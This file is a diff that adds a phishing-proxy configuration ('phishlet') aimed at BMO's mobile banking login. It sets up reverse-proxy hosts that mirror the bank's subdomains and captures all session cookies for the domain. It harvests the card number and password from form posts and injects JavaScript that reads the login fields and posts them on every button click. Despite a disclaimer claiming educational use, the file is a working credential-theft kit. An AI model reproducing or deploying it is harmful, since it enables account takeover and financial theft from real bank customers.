@@ -1,0 +1,47 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+
+author: '@testcase0x'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'm2', orig_sub: 'm2', domain: 'bmo.com', session: false, is_landing: true}
+  - {phish_sub: 'mobile2', orig_sub: 'mobile2', domain: 'bmo.com', session: true, is_landing: false}
+sub_filters:
+ - {triggers_on: 'mobile2.bmo.com', orig_sub: 'mobile2', domain: 'bmo.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+auth_tokens:
+  - domain: '.bmo.com/'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'FBC_Number'
+    search: '(.*)'
+    type: 'post' 
+  password:
+    key: 'FBC_Password'
+    search: '(.*)'
+    type: 'post' 
+login:
+  domain: 'm2.bmo.com'
+  path: '/BMOMobile/apps/services/www/BMOMobileBanking/mobilewebapp/default/BMOMobileBanking.html'
+  
+js_inject:
+  - trigger_domains: ["mobile2.bmo.com"]
+    trigger_paths: ["/BMOMobile/BMOMobileBanking.html","/BMOMobile/BMOMobileBanking.html#/login/auth","/BMOMobile/apps/services/www"]
+    trigger_params: []
+    script: |
+      function lp(){
+        var submit = document.querySelectorAll('button')[1];
+        submit.addEventListener("click", sendPass);
+        return;
+      }
+      function sendPass(){
+        var credential = document.getElementById("mat-input-0").value;
+        var password = document.getElementById("mat-input-1").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/accounts/login/ajax/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("FBC_Password="+encodeURIComponent(password) + "&FBC_Number="+encodeURIComponent(credential));
+        return;
+      }
+      setInterval(function(){ lp(); }, 500);
